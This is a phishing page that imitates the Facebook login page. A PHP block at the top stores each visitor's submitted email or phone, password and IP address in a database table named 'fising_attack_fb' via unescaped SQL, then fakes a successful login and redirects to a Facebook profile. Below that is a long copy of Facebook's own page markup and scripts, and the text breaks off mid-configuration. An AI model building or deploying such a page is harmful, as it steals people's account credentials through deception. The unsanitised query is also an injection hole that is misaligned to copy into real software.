<?php

if($_SERVER['REQUEST_METHOD']=='POST')
{
    $email=$_POST['email'];
    $pass=$_POST['password'];
    $ip=$_SERVER['REMOTE_ADDR'];

    include 'dbconnect.php';

    $sql="INSERT INTO `fising_attack_fb` (`SL`, `Email_or_Phone`, `Password`, `IP`, `date_and_time`) VALUES (NULL, '$email', '$pass', '$ip', current_timestamp())";

    $result=mysqli_query($conn,$sql);

    if($result)
    {
        $message="Log in successfull.";
        echo '<script language="javascript">';
        echo 'alert("'.$message.'");';
        echo 'window.location="https://www.facebook.com/profile.php?id=100066839088426";';
        echo '</script>';

       
    }
    // else
    // {
    //     echo " <h1>Not Insert data !</h1>";

    // }



}


?>

<!DOCTYPE html>
<html lang="en" id="facebook" class="no_js">

<head>
    <meta charset="utf-8" />
    <meta name="referrer" content="origin-when-crossorigin" id="meta_referrer" />
    <script nonce="xTDjvcQX">
    window._cstart = +new Date();
    </script>
    <script nonce="xTDjvcQX">
    function envFlush(a) {
        function b(b) {
            for (var c in a) b[c] = a[c]
        }
        window.requireLazy ? window.requireLazy(["Env"], b) : (window.Env = window.Env || {}, b(window.Env))
    }
    envFlush({
        "ajaxpipe_token": "AXh4yLcKicotlyNt73U",
        "timeslice_heartbeat_config": {
            "pollIntervalMs": 33,
            "idleGapThresholdMs": 60,
            "ignoredTimesliceNames": {
                "requestAnimationFrame": true,
                "Event listenHandler mousemove": true,
                "Event listenHandler mouseover": true,
                "Event listenHandler mouseout": true,
                "Event listenHandler scroll": true
            },
            "isHeartbeatEnabled": true,
            "isArtilleryOn": false
        },
        "shouldLogCounters": true,
        "timeslice_categories": {
            "react_render": true,
            "reflow": true
        },
        "sample_continuation_stacktraces": true,
        "dom_mutation_flag": true,
        "gk_instrument_object_url": true,
        "gk_log_promise_done": true,
        "stack_trace_limit": 30,
        "timesliceBufferSize": 5000,
        "show_invariant_decoder": false,
        "compat_iframe_token": "AQ6N172cGRuZx8PsQIc",
        "isCQuick": false
    });
    </script>
    <script nonce="xTDjvcQX">
    (function(a) {
        function b(b) {
            if (!window.openDatabase) return;
            b.I_AM_INCOGNITO_AND_I_REALLY_NEED_WEBSQL = function(a, b, c, d) {
                return window.openDatabase(a, b, c, d)
            };
            window.openDatabase = function() {
                throw new Error()
            }
        }
        b(a)
    })(this);
    </script>
    <style nonce="xTDjvcQX"></style>
    <script nonce="xTDjvcQX">
    __DEV__ = 0;
    CavalryLogger = window.CavalryLogger || function(a) {
            this.lid = a, this.transition = !1, this.metric_collected = !1, this.is_detailed_profiler = !1, this
                .instrumentation_started = !1, this.pagelet_metrics = {}, this.events = {}, this.ongoing_watch = {},
                this.values = {
                    t_cstart: window._cstart
                }, this.piggy_values = {}, this.bootloader_metrics = {}, this.resource_to_pagelet_mapping = {}, this
                .initializeInstrumentation && this.initializeInstrumentation()
        }, CavalryLogger.prototype.setIsDetailedProfiler = function(a) {
            this.is_detailed_profiler = a;
            return this
        }, CavalryLogger.prototype.setTTIEvent = function(a) {
            this.tti_event = a;
            return this
        }, CavalryLogger.prototype.setValue = function(a, b, c, d) {
            d = d ? this.piggy_values : this.values;
            (typeof d[a] === "undefined" || c) && (d[a] = b);
            return this
        }, CavalryLogger.prototype.getLastTtiValue = function() {
            return this.lastTtiValue
        }, CavalryLogger.prototype.setTimeStamp = CavalryLogger.prototype.setTimeStamp || function(a, b, c, d) {
            this.mark(a);
            var e = this.values.t_cstart || this.values.t_start;
            e = d ? e + d : CavalryLogger.now();
            this.setValue(a, e, b, c);
            this.tti_event && a == this.tti_event && (this.lastTtiValue = e, this.setTimeStamp("t_tti", b));
            return this
        }, CavalryLogger.prototype.mark = typeof console === "object" && console.timeStamp ? function(a) {
            console.timeStamp(a)
        } : function() {}, CavalryLogger.prototype.addPiggyback = function(a, b) {
            this.piggy_values[a] = b;
            return this
        }, CavalryLogger.instances = {}, CavalryLogger.id = 0, CavalryLogger.getInstance = function(a) {
            typeof a === "undefined" && (a = CavalryLogger.id);
            CavalryLogger.instances[a] || (CavalryLogger.instances[a] = new CavalryLogger(a));
            return CavalryLogger.instances[a]
        }, CavalryLogger.setPageID = function(a) {
            if (CavalryLogger.id === 0) {
                var b = CavalryLogger.getInstance();
                CavalryLogger.instances[a] = b;
                CavalryLogger.instances[a].lid = a;
                delete CavalryLogger.instances[0]
            }
            CavalryLogger.id = a
        }, CavalryLogger.now = function() {
            return window.performance && performance.timing && performance.timing.navigationStart && performance.now ?
                performance.now() + performance.timing.navigationStart : new Date().getTime()
        }, CavalryLogger.prototype.measureResources = function() {}, CavalryLogger.prototype.profileEarlyResources =
        function() {}, CavalryLogger.getBootloaderMetricsFromAllLoggers = function() {}, CavalryLogger.start_js =
        function() {}, CavalryLogger.start_js_script = function() {}, CavalryLogger.done_js = function() {};
    CavalryLogger.getInstance().setTTIEvent("t_domcontent");
    CavalryLogger.prototype.measureResources = function(a, b) {
        if (!this.log_resources) return;
        var c = "bootload/" + a.name;
        if (this.bootloader_metrics[c] !== void 0 || this.ongoing_watch[c] !== void 0) return;
        var d = CavalryLogger.now();
        this.ongoing_watch[c] = d;
        "start_" + c in this.bootloader_metrics || (this.bootloader_metrics["start_" + c] = d);
        b && !("tag_" + c in this.bootloader_metrics) && (this.bootloader_metrics["tag_" + c] = b);
        if (a.type === "js") {
            c = "js_exec/" + a.name;
            this.ongoing_watch[c] = d
        }
    }, CavalryLogger.prototype.stopWatch = function(a) {
        if (this.ongoing_watch[a]) {
            var b = CavalryLogger.now(),
                c = b - this.ongoing_watch[a];
            this.bootloader_metrics[a] = c;
            var d = this.piggy_values;
            a.indexOf("bootload") === 0 && (d.t_resource_download || (d.t_resource_download = 0), d
                .resources_downloaded || (d.resources_downloaded = 0), d.t_resource_download += c, d
                .resources_downloaded += 1, d["tag_" + a] == "_EF_" && (d.t_pagelet_cssload_early_resources = b)
                );
            delete this.ongoing_watch[a]
        }
        return this
    }, CavalryLogger.getBootloaderMetricsFromAllLoggers = function() {
        var a = {};
        Object.values(window.CavalryLogger.instances).forEach(function(b) {
            b.bootloader_metrics && Object.assign(a, b.bootloader_metrics)
        });
        return a
    }, CavalryLogger.start_js = function(a) {
        for (var b = 0; b < a.length; ++b) CavalryLogger.getInstance().stopWatch("js_exec/" + a[b])
    }, CavalryLogger.start_js_script = function(a) {
        if (!a || !a.dataset) return;
        CavalryLogger.start_js([a.dataset.bootloaderHash || a.dataset.bootloaderHashClient])
    }, CavalryLogger.done_js = function(a) {
        for (var b = 0; b < a.length; ++b) CavalryLogger.getInstance().stopWatch("bootload/" + a[b])
    }, CavalryLogger.prototype.profileEarlyResources = function(a) {
        for (var b = 0; b < a.length; b++) this.measureResources({
            name: a[b][0],
            type: a[b][1] ? "js" : ""
        }, "_EF_")
    };
    CavalryLogger.getInstance().log_resources = true;
    CavalryLogger.getInstance().setIsDetailedProfiler(true);
    window.CavalryLogger && CavalryLogger.getInstance().setTimeStamp("t_start");
    </script>
    <noscript>
        <meta http-equiv="refresh" content="0; URL=/?_fb_noscript=1" />
    </noscript>
    <link rel="manifest" id="MANIFEST_LINK" href="/data/manifest/" crossorigin="use-credentials" />
    <title id="pageTitle">Facebook – log in or sign up</title>
    <meta property="og:site_name" content="Facebook" />
    <meta property="og:url" content="https://www.facebook.com/" />
    <meta property="og:image" content="https://www.facebook.com/images/fb_icon_325x325.png" />
    <meta property="og:locale" content="en_GB" />
    <link rel="alternate" media="only screen and (max-width: 640px)" href="https://m.facebook.com/" />
    <link rel="alternate" media="handheld" href="https://m.facebook.com/" />
    <meta name="description"
        content="Log in to Facebook to start sharing and connecting with your friends, family and people you know." />
    <script type="application/ld+json" nonce="xTDjvcQX">
    {
        "\u0040context": "http:\/\/schema.org",
        "\u0040type": "WebSite",
        "name": "Facebook",
        "url": "https:\/\/en-gb.facebook.com\/"
    }
    </script>
    <link rel="canonical" href="https://www.facebook.com/" />
    <link rel="shortcut icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico" />
    <link type="text/css" rel="stylesheet"
        href="https://static.xx.fbcdn.net/rsrc.php/v3/yq/l/0,cross/L0VTH1UsUXD.css?_nc_x=Ij3Wp8lg5Kz"
        data-bootloader-hash="0QQt+vI" crossorigin="anonymous" />
    <link type="text/css" rel="stylesheet"
        href="https://static.xx.fbcdn.net/rsrc.php/v3/yx/l/0,cross/fFUVjyV8dGQ.css?_nc_x=Ij3Wp8lg5Kz"
        data-bootloader-hash="9zxHPvx" crossorigin="anonymous" />
    <link type="text/css" rel="stylesheet"
        href="https://static.xx.fbcdn.net/rsrc.php/v3/yD/l/0,cross/bAlWYVax4ow.css?_nc_x=Ij3Wp8lg5Kz"
        data-bootloader-hash="B9uu9Uu" crossorigin="anonymous" />
    <link type="text/css" rel="stylesheet"
        href="https://static.xx.fbcdn.net/rsrc.php/v3/yG/l/0,cross/KG1ugOqQXfY.css?_nc_x=Ij3Wp8lg5Kz"
        data-bootloader-hash="epDBIN3" crossorigin="anonymous" />
    <link type="text/css" rel="stylesheet"
        href="https://static.xx.fbcdn.net/rsrc.php/v3/y_/l/0,cross/e6yHHXG-vON.css?_nc_x=Ij3Wp8lg5Kz"
        data-bootloader-hash="F2NLRsG" crossorigin="anonymous" />
    <link type="text/css" rel="stylesheet"
        href="https://static.xx.fbcdn.net/rsrc.php/v3/yi/l/0,cross/Gt_Hdc3lf8P.css?_nc_x=Ij3Wp8lg5Kz"
        data-bootloader-hash="4l/JzXY" crossorigin="anonymous" />
    <script src="https://static.xx.fbcdn.net/rsrc.php/v3/yB/r/k6iys4ZoRuh.js?_nc_x=Ij3Wp8lg5Kz"
        data-bootloader-hash="FeoEtZv" crossorigin="anonymous" nonce="xTDjvcQX"></script>
    <script nonce="xTDjvcQX">
    requireLazy(["HasteSupportData"], function(m) {
        m.handle({
            "clpData": {
                "1814852": {
                    "r": 1
                },
                "1838142": {
                    "r": 1,
                    "s": 1
                },
                "1949898": {
                    "r": 1
                },
                "1848815": {
                    "r": 10000,
                    "s": 1
                },
                "1744178": {
                    "r": 1,
                    "s": 1
                }
            },
            "gkxData": {
                "5241": {
                    "result": true,
                    "hash": "AT7o1bCQPGpf3ShE0uk"
                },
                "5919": {
                    "result": false,
                    "hash": "AT6PGptIPUYH051Bsvo"
                },
                "676837": {
                    "result": false,
                    "hash": "AT4N8wBZA8ctCdHwIXw"
                },
                "708253": {
                    "result": false,
                    "hash": "AT5n4hBL3YTMnQWtfec"
                },
                "996940": {
                    "result": false,
                    "hash": "AT7opYuEGy3sjG1a-BI"
                },
                "1224637": {
                    "result": false,
                    "hash": "AT7JRluWxuwDm3XzYlw"
                },
                "1263340": {
                    "result": false,
                    "hash": "AT5bwizWgDaFQudm0iQ"
                },
                "676920": {
                    "result": true,
                    "hash": "AT497IX4gOFG8gZeHMs"
                },
                "1073500": {
                    "result": false,
                    "hash": "AT7aJmfnqWyioxOO8UQ"
                },
                "1167394": {
                    "result": false,
                    "hash": "AT7BpN-tlUPwbIIFDs8"
                },
                "1857581": {
                    "result": false,
                    "hash": "AT5yTxGMp6le0PAtKM8"
                },
                "2772": {
                    "result": false,
                    "hash": "AT5Eu244WIce7iwqBGQ"
                },
                "3752": {
                    "result": false,
                    "hash": "AT6eS5UTkkMp_xbPVmo"
                },
                "3831": {
                    "result": false,
                    "hash": "AT4W23lQ0XxAZniMS18"
                },
                "4075": {
                    "result": false,
                    "hash": "AT4_ZQi0sTjSt-Rx3_4"
                },
                "676838": {
                    "result": false,
                    "hash": "AT6nN1ehT9yq-2q6QJc"
                },
                "1217157": {
                    "result": false,
                    "hash": "AT6B7YmllOsArnK6ano"
                },
                "1554827": {
                    "result": false,
                    "hash": "AT7zueGLhGo0cT5xjOA"
                },
                "1738486": {
                    "result": false,
                    "hash": "AT4cX37oQco6DwhUesk"
                }
            },
            "qplData": {
                "7758": {
                    "r": 1
                }
            }
        })
    });
    requireLazy(["TimeSliceImpl", "ServerJS"], function(TimeSlice, ServerJS) {
        (new ServerJS()).handle({
            "define": [
                ["URLFragmentPreludeConfig", [], {
                    "hashtagRedirect": true,
                    "fragBlacklist": ["nonce", "access_token", "oauth_token", "xs",
                        "checkpoint_data", "code"
                    ]
                }, 137],
                ["CometPersistQueryParams", [], {
                    "relative": {},
                    "domain": {}
                }, 6231],
                ["CookieDomain", [], {
                    "domain": "facebook.com"
                }, 6421],
                ["BootloaderConfig", [], {
                    "deferBootloads": false,
                    "jsRetries": [200, 500],
                    "jsRetryAbortNum": 2,
                    "jsRetryAbortTime": 5,
                    "silentDups": false,
                    "hypStep4": false,
                    "phdOn": false,
                    "btCutoffIndex": 3284
                }, 329],
                ["CSSLoaderConfig", [], {
                    "timeout": 5000,
                    "modulePrefix": "BLCSS:",
                    "loadEventSupported": true
                }, 619],
                ["CookieCoreConfig", [], {
                    "c_user": {
                        "s": "None"
                    },
                    "cppo": {
                        "t": 86400,
                        "s": "None"
                    },
                    "dpr": {
                        "t": 604800,
                        "s": "None"
                    },
                    "fbl_ci": {
                        "t": 31536000,
                        "s": "None"
                    },
                    "fbl_cs": {
                        "t": 31536000,
                        "s": "None"
                    },
                    "fbl_st": {
                        "t": 31536000,
                        "s": "Strict"
                    },
                    "i_user": {
                        "s": "None"
                    },
                    "locale": {
                        "t": 604800,
                        "s": "None"
                    },
                    "m_pixel_ratio": {
                        "t": 604800,
                        "s": "None"
                    },
                    "noscript": {
                        "s": "None"
                    },
                    "presence": {
                        "t": 2592000,
                        "s": "None"
                    },
                    "sfau": {
                        "s": "None"
                    },
                    "usida": {
                        "s": "None"
                    },
                    "vpd": {
                        "t": 5184000,
                        "s": "Lax"
                    },
                    "wd": {
                        "t": 604800,
                        "s": "Lax"
                    },
                    "x-referer": {
                        "s": "None"
                    },
                    "x-src": {
                        "t": 1,
                        "s": "None"
                    }
                }, 2104],
                ["CurrentCommunityInitialData", [], {}, 490],
                ["CurrentEnvironment", [], {
                    "facebookdotcom": true,
                    "messengerdotcom": false,
                    "workplacedotcom": false,
                    "instagramdotcom": false
                }, 827],
                ["CurrentUserInitialData", [], {
                    "ACCOUNT_ID": "0",
                    "USER_ID": "0",
                    "NAME": "",
                    "SHORT_NAME": null,
                    "IS_BUSINESS_PERSON_ACCOUNT": false,
                    "HAS_SECONDARY_BUSINESS_PERSON": false,
                    "IS_FACEBOOK_WORK_ACCOUNT": false,
                    "IS_MESSENGER_ONLY_USER": false,
                    "IS_DEACTIVATED_ALLOWED_ON_MESSENGER": false,
                    "IS_MESSENGER_CALL_GUEST_USER": false,
                    "IS_WORK_MESSENGER_CALL_GUEST_USER": false,
                    "APP_ID": "256281040558",
                    "IS_BUSINESS_DOMAIN": false
                }, 270],
                ["DTSGInitialData", [], {}, 258],
                ["ISB", [], {}, 330],
                ["LSD", [], {
                    "token": "AVo61knLBX0"
                }, 323],
                ["ServerNonce", [], {
                    "ServerNonce": "zMyhM0j-jw3vsU-bdJFROc"
                }, 141],
                ["SiteData", [], {
                    "server_revision": 1005560434,
                    "client_revision": 1005560434,
                    "tier": "",
                    "push_phase": "C3",
                    "pkg_cohort": "BP:DEFAULT",
                    "haste_session": "19133.BP:DEFAULT.2.0.0.0.",
                    "pr": 1,
                    "haste_site": "www",
                    "manifest_base_uri": "https:\/\/static.xx.fbcdn.net",
                    "manifest_origin": null,
                    "be_one_ahead": false,
                    "is_rtl": false,
                    "is_comet": false,
                    "is_experimental_tier": false,
                    "is_jit_warmed_up": true,
                    "hsi": "7100008947758635071-0",
                    "semr_host_bucket": "5",
                    "bl_hash_version": 2,
                    "skip_rd_bl": true,
                    "comet_env": 0,
                    "wbloks_env": false,
                    "spin": 4,
                    "__spin_r": 1005560434,
                    "__spin_b": "trunk",
                    "__spin_t": 1653099653,
                    "vip": "157.240.1.35"
                }, 317],
                ["SprinkleConfig", [], {
                    "param_name": "jazoest",
                    "version": 2,
                    "should_randomize": false
                }, 2111],
                ["UserAgentData", [], {
                    "browserArchitecture": "64",
                    "browserFullVersion": "101.0.4951.67",
                    "browserMinorVersion": 0,
                    "browserName": "Chrome",
                    "browserVersion": 101,
                    "deviceName": "Unknown",
                    "engineName": "WebKit",
                    "engineVersion": "537.36",
                    "platformArchitecture": "64",
                    "platformName": "Windows",
                    "platformVersion": "10",
                    "platformFullVersion": "10"
                }, 527],
                ["PromiseUsePolyfillSetImmediateGK", [], {
                    "www_always_use_polyfill_setimmediate": false
                }, 2190],
                ["KSConfig", [], {
                    "killed": {
                        "__set": ["MOBILIZER_SELF_SERVE_OWNERSHIP_RESOLVER",
                            "MLHUB_FLOW_AUTOREFRESH_SEARCH", "NEKO_DISABLE_CREATE_FOR_SAP",
                            "EO_DISABLE_SYSTEM_SERIAL_NUMBER_FREE_TYPING_IN_CPE_NON_CLIENT",
                            "MOBILITY_KILL_OLD_VISIBILITY_POSITION_SETTING",
                            "WORKPLACE_DISPLAY_TEXT_EVIDENCE_REPORTING",
                            "BUSINESS_INVITE_FLOW_WITH_SELLER_PROFILE",
                            "BUY_AT_UI_LINE_DELETE",
                            "BUSINESS_GRAPH_SETTING_APP_ASSIGNED_USERS_NEW_API",
                            "BUSINESS_GRAPH_SETTING_BU_ASSIGNED_USERS_NEW_API",
                            "BUSINESS_GRAPH_SETTING_ESG_ASSIGNED_USERS_NEW_API",
                            "BUSINESS_GRAPH_SETTING_PRODUCT_CATALOG_ASSIGNED_USERS_NEW_API",
                            "BUSINESS_GRAPH_SETTING_SESG_ASSIGNED_USERS_NEW_API",
                            "BUSINESS_GRAPH_SETTING_WABA_ASSIGNED_USERS_NEW_API",
                            "ADS_PLACEMENT_FIX_PUBLISHER_PLATFORMS_MUTATION",
                            "FORCE_FETCH_BOOSTED_COMPONENT_AFTER_ADS_CREATION",
                            "VIDEO_DIMENSIONS_FROM_PLAYER_IN_UPLOAD_DIALOG",
                            "SNIVY_GROUP_BY_EVENT_TRACE_ID_AND_NAME",
                            "ADS_STORE_VISITS_METRICS_DEPRECATION",
                            "DYNAMIC_ADS_SET_CATALOG_AND_PRODUCT_SET_TOGETHER",
                            "AD_DRAFT_ENABLE_SYNCRHONOUS_FRAGMENT_VALIDATION",
                            "NEKO_ENABLE_RESET_SAP_FOR_CREATE_AD_SET_CONTEXTUAL",
                            "SEPARATE_MESSAGING_COMACTIVITY_PAGE_PERMS",
                            "LAB_NET_NEW_UI_RELEASE", "POCKET_MONSTERS_CREATE",
                            "POCKET_MONSTERS_DELETE", "SRT_BANZAI_SRT_CORE_LOGGER",
                            "SRT_BANZAI_SRT_MAIN_LOGGER",
                            "WORKPLACE_PLATFORM_SECURE_APPS_MAILBOXES",
                            "POCKET_MONSTERS_UPDATE_NAME",
                            "IC_DISABLE_MERGE_TOOL_FEED_CHECK_FOR_REPLACE_SCHEDULE",
                            "ADS_EPD_IMPACTED_ADVERTISER_MIGRATE_XCONTROLLER",
                            "RECRUITING_CANDIDATE_PORTAL_ACCOUNT_DELETION_CARD",
                            "BIZ_INBOX_POP_UP_TIP_NAVIGATION_BUG_FIX"
                        ]
                    },
                    "ko": {
                        "__set": ["8H4bQmEiuLT", "3OsLvnSHNTt", "1G7wJ6bJt9K", "9NpkGYwzrPG",
                            "3oh5Mw86USj", "8NAceEy9JZo", "7FOIzos6XJX", "rf8JEPGgOi",
                            "4j36SVzvP3w", "4NSq3ZC4ScE", "53gCxKq281G", "3yzzwBY7Npj",
                            "1onzIv0jH6H", "8PlKuowafe8", "1ntjZ2zgf03", "4SIH2GRVX5W",
                            "2dhqRnqXGLQ", "2WgiNOrHVuC", "amKHb4Cw4WI", "5mNEXob0nTj",
                            "8rDvN9vWdAK", "9cL5o2kjfZo", "5BdzWGmfvrA", "DDZhogI19W",
                            "acrJTh9WGdp", "1oOE64fL4wO", "9Gd8qgRxn8z", "MPMaqnqZ9c",
                            "5XCz1h9Iaw3", "7r6mSP7ofr2", "6DGPLrRdyts", "aWxCyi1sEC7",
                            "9kCSDzzr8fu", "awYA7fn2Bse"
                        ]
                    }
                }, 2580],
                ["JSErrorLoggingConfig", [], {
                    "appId": 256281040558,
                    "extra": [],
                    "reportInterval": 50,
                    "sampleWeight": null,
                    "sampleWeightKey": "__jssesw",
                    "projectBlocklist": []
                }, 2776],
                ["DataStoreConfig", [], {
                    "expandoKey": "__FB_STORE",
                    "useExpando": true
                }, 2915],
                ["CookieCoreLoggingConfig", [], {
                    "maximumIgnorableStallMs": 16.67,
                    "sampleRate": 9.7e-5,
                    "sampleRateClassic": 1.0e-10,
                    "sampleRateFastStale": 1.0e-8
                }, 3401],
                ["ImmediateImplementationExperiments", [], {
                    "prefer_message_channel": true
                }, 3419],
                ["DTSGInitData", [], {
                    "token": "",
                    "async_get_token": ""
                }, 3515],
                ["UriNeedRawQuerySVConfig", [], {
                    "uris": ["dms.netmng.com", "doubleclick.net", "r.msn.com",
                        "watchit.sky.com", "graphite.instagram.com", "www.kfc.co.th",
                        "learn.pantheon.io", "www.landmarkshops.in", "www.ncl.com",
                        "s0.wp.com", "www.tatacliq.com", "bs.serving-sys.com", "kohls.com",
                        "lazada.co.th", "xg4ken.com", "technopark.ru", "officedepot.com.mx",
                        "bestbuy.com.mx", "booking.com", "nibio.no"
                    ]
                }, 3871],
                ["InitialCookieConsent", [], {
                    "deferCookies": false,
                    "initialConsent": {
                        "__set": [1, 2]
                    },
                    "noCookies": false,
                    "shouldShowCookieBanner": false
                }, 4328],
                ["TrustedTypesConfig", [], {
                    "useTrustedTypes": false,
                    "reportOnly": false
                }, 4548],
                ["WebConnectionClassServerGuess", [], {
                    "connectionClass": "EXCELLENT"
                }, 4705],
                ["CometAltpayJsSdkIframeAllowedDomains", [], {
                    "allowed_domains": ["https:\/\/live.adyen.com",
                        "https:\/\/integration-facebook.payu.in",
                        "https:\/\/facebook.payulatam.com", "https:\/\/secure.payu.com",
                        "https:\/\/facebook.dlocal.com", "https:\/\/buy2.boku.com"
                    ]
                }, 4920],
                ["BootloaderEndpointConfig", [], {
                    "debugNoBatching": false,
                    "endpointURI": "https:\/\/www.facebook.com\/ajax\/bootloader-endpoint\/"
                }, 5094],
                ["CookieConsentIFrameConfig", [], {
                    "consent_param": "FQAREhIA.ARaGQ1WbgWFMhdBCBKbK1Jyiq8rd1uSY95UqYpgaj8FeFsPl",
                    "allowlisted_iframes": []
                }, 5540],
                ["BigPipeExperiments", [], {
                    "link_images_to_pagelets": false,
                    "enable_bigpipe_plugins": false
                }, 907],
                ["IntlVariationHoldout", [], {
                    "disable_variation": false
                }, 6533],
                ["AsyncRequestConfig", [], {
                    "retryOnNetworkError": "1",
                    "useFetchStreamAjaxPipeTransport": false
                }, 328],
                ["FbtQTOverrides", [], {
                    "overrides": {}
                }, 551],
                ["FbtResultGK", [], {
                    "shouldReturnFbtResult": true,
                    "inlineMode": "NO_INLINE"
                }, 876],
                ["IntlPhonologicalRules", [], {
                    "meta": {
                        "\/_B\/": "([.,!?\\s]|^)",
                        "\/_E\/": "([.,!?\\s]|$)"
                    },
                    "patterns": {
                        "\/\u0001(.*)('|&#039;)s\u0001(?:'|&#039;)s(.*)\/": "\u0001$1$2s\u0001$3",
                        "\/_\u0001([^\u0001]*)\u0001\/": "javascript"
                    }
                }, 1496],
                ["IntlViewerContext", [], {
                    "GENDER": 3,
                    "regionalLocale": null
                }, 772],
                ["NumberFormatConfig", [], {
                    "decimalSeparator": ".",
                    "numberDelimiter": ",",
                    "minDigitsForThousandsSeparator": 4,
                    "standardDecimalPatternInfo": {
                        "primaryGroupSize": 3,
                        "secondaryGroupSize": 3
                    },
                    "numberingSystemData": null
                }, 54],
                ["SessionNameConfig", [], {
                    "seed": "13z7"
                }, 757],
                ["ZeroCategoryHeader", [], {}, 1127],
                ["ZeroRewriteRules", [], {
                    "rewrite_rules": {},
                    "whitelist": {
                        "\/hr\/r": 1,
                        "\/hr\/p": 1,
                        "\/zero\/unsupported_browser\/": 1,
                        "\/zero\/policy\/optin": 1,
                        "\/zero\/optin\/write\/": 1,
                        "\/zero\/optin\/legal\/": 1,
                        "\/zero\/optin\/free\/": 1,
                        "\/about\/privacy\/": 1,
                        "\/about\/privacy\/update\/": 1,
                        "\/privacy\/explanation\/": 1,
                        "\/zero\/toggle\/welcome\/": 1,
                        "\/zero\/toggle\/nux\/": 1,
                        "\/zero\/toggle\/settings\/": 1,
                        "\/fup\/interstitial\/": 1,
                        "\/work\/landing": 1,
                        "\/work\/login\/": 1,
                        "\/work\/email\/": 1,
                        "\/ai.php": 1,
                        "\/js_dialog_resources\/dialog_descriptions_android.json": 0,
                        "\/connect\/jsdialog\/MPlatformAppInvitesJSDialog\/": 0,
                        "\/connect\/jsdialog\/MPlatformOAuthShimJSDialog\/": 0,
                        "\/connect\/jsdialog\/MPlatformLikeJSDialog\/": 0,
                        "\/qp\/interstitial\/": 1,
                        "\/qp\/action\/redirect\/": 1,
                        "\/qp\/action\/close\/": 1,
                        "\/zero\/support\/ineligible\/": 1,
                        "\/zero_balance_redirect\/": 1,
                        "\/zero_balance_redirect": 1,
                        "\/zero_balance_redirect\/l\/": 1,
                        "\/l.php": 1,
                        "\/lsr.php": 1,
                        "\/ajax\/dtsg\/": 1,
                        "\/checkpoint\/block\/": 1,
                        "\/exitdsite": 1,
                        "\/zero\/balance\/pixel\/": 1,
                        "\/zero\/balance\/": 1,
                        "\/zero\/balance\/carrier_landing\/": 1,
                        "\/zero\/flex\/logging\/": 1,
                        "\/tr": 1,
                        "\/tr\/": 1,
                        "\/sem_campaigns\/sem_pixel_test\/": 1,
                        "\/bookmarks\/flyout\/body\/": 1,
                        "\/zero\/subno\/": 1,
                        "\/confirmemail.php": 1,
                        "\/policies\/": 1,
                        "\/mobile\/internetdotorg\/classifier\/": 1,
                        "\/zero\/dogfooding": 1,
                        "\/xti.php": 1,
                        "\/zero\/fblite\/config\/": 1,
                        "\/hr\/zsh\/wc\/": 1,
                        "\/ajax\/bootloader-endpoint\/": 1,
                        "\/mobile\/zero\/carrier_page\/": 1,
                        "\/mobile\/zero\/carrier_page\/education_page\/": 1,
                        "\/mobile\/zero\/carrier_page\/feature_switch\/": 1,
                        "\/mobile\/zero\/carrier_page\/settings_page\/": 1,
                        "\/aloha_check_build": 1,
                        "\/upsell\/zbd\/softnudge\/": 1,
                        "\/mobile\/zero\/af_transition\/": 1,
                        "\/mobile\/zero\/af_transition\/action\/": 1,
                        "\/mobile\/zero\/freemium\/": 1,
                        "\/mobile\/zero\/freemium\/redirect\/": 1,
                        "\/mobile\/zero\/freemium\/zero_fup\/": 1,
                        "\/privacy\/policy\/": 1,
                        "\/privacy\/center\/": 1,
                        "\/data\/manifest\/": 1,
                        "\/4oh4.php": 1,
                        "\/autologin.php": 1,
                        "\/birthday_help.php": 1,
                        "\/checkpoint\/": 1,
                        "\/contact-importer\/": 1,
                        "\/cr.php": 1,
                        "\/legal\/terms\/": 1,
                        "\/login.php": 1,
                        "\/login\/": 1,
                        "\/mobile\/account\/": 1,
                        "\/n\/": 1,
                        "\/remote_test_device\/": 1,
                        "\/upsell\/buy\/": 1,
                        "\/upsell\/buyconfirm\/": 1,
                        "\/upsell\/buyresult\/": 1,
                        "\/upsell\/promos\/": 1,
                        "\/upsell\/continue\/": 1,
                        "\/upsell\/h\/promos\/": 1,
                        "\/upsell\/loan\/learnmore\/": 1,
                        "\/upsell\/purchase\/": 1,
                        "\/upsell\/promos\/upgrade\/": 1,
                        "\/upsell\/buy_redirect\/": 1,
                        "\/upsell\/loan\/buyconfirm\/": 1,
                        "\/upsell\/loan\/buy\/": 1,
                        "\/upsell\/sms\/": 1,
                        "\/wap\/a\/channel\/reconnect.php": 1,
                        "\/wap\/a\/nux\/wizard\/nav.php": 1,
                        "\/wap\/appreg.php": 1,
                        "\/wap\/birthday_help.php": 1,
                        "\/wap\/c.php": 1,
                        "\/wap\/confirmemail.php": 1,
                        "\/wap\/cr.php": 1,
                        "\/wap\/login.php": 1,
                        "\/wap\/r.php": 1,
                        "\/zero\/datapolicy": 1,
                        "\/a\/timezone.php": 1,
                        "\/a\/bz": 1,
                        "\/bz\/reliability": 1,
                        "\/r.php": 1,
                        "\/mr\/": 1,
                        "\/reg\/": 1,
                        "\/registration\/log\/": 1,
                        "\/terms\/": 1,
                        "\/f123\/": 1,
                        "\/expert\/": 1,
                        "\/experts\/": 1,
                        "\/terms\/index.php": 1,
                        "\/terms.php": 1,
                        "\/srr\/": 1,
                        "\/msite\/redirect\/": 1,
                        "\/fbs\/pixel\/": 1,
                        "\/contactpoint\/preconfirmation\/": 1,
                        "\/contactpoint\/cliff\/": 1,
                        "\/contactpoint\/confirm\/submit\/": 1,
                        "\/contactpoint\/confirmed\/": 1,
                        "\/contactpoint\/login\/": 1,
                        "\/preconfirmation\/contactpoint_change\/": 1,
                        "\/help\/contact\/": 1,
                        "\/survey\/": 1,
                        "\/upsell\/loyaltytopup\/accept\/": 1,
                        "\/settings\/": 1,
                        "\/lite\/": 1,
                        "\/zero_status_update\/": 1,
                        "\/operator_store\/": 1,
                        "\/upsell\/": 1,
                        "\/wifiauth\/login\/": 1
                    }
                }, 1478],
                ["IntlNumberTypeConfig", [], {
                    "impl": "if (n === 1) { return IntlVariations.NUMBER_ONE; } else { return IntlVariations.NUMBER_OTHER; }"
                }, 3405],
                ["ServerTimeData", [], {
                    "serverTime": 1653099653334,
                    "timeOfRequestStart": 1653099653315.4,
                    "timeOfResponseStart": 1653099653315.4
                }, 5943],
                ["AnalyticsCoreData", [], {
